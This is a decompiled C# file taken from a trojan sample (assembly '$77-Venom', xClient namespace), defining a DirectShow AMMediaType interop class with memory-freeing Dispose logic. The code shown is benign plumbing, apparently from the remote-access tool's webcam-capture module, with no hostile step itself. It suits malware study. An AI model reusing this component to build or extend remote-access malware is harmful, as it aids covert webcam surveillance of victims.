// Decompiled with JetBrains decompiler
// Type: xClient.Core.AForge.Video.DirectShow.Internals.AMMediaType
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Runtime.InteropServices;

namespace xClient.Core.AForge.Video.DirectShow.Internals
{
  [ComVisible(false)]
  [StructLayout(LayoutKind.Sequential)]
  internal class AMMediaType : IDisposable
  {
    public Guid MajorType;
    public Guid SubType;
    [MarshalAs(UnmanagedType.Bool)]
    public bool FixedSizeSamples = true;
    [MarshalAs(UnmanagedType.Bool)]
    public bool TemporalCompression;
    public int SampleSize = 1;
    public Guid FormatType;
    public IntPtr unkPtr;
    public int FormatSize;
    public IntPtr FormatPtr;

    ~AMMediaType() => this.Dispose(false);

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    protected virtual void Dispose(bool disposing)
    {
      if (this.FormatSize != 0 && this.FormatPtr != IntPtr.Zero)
      {
        Marshal.FreeCoTaskMem(this.FormatPtr);
        this.FormatSize = 0;
      }
      if (!(this.unkPtr != IntPtr.Zero))
        return;
      Marshal.Release(this.unkPtr);
      this.unkPtr = IntPtr.Zero;
    }
  }
}
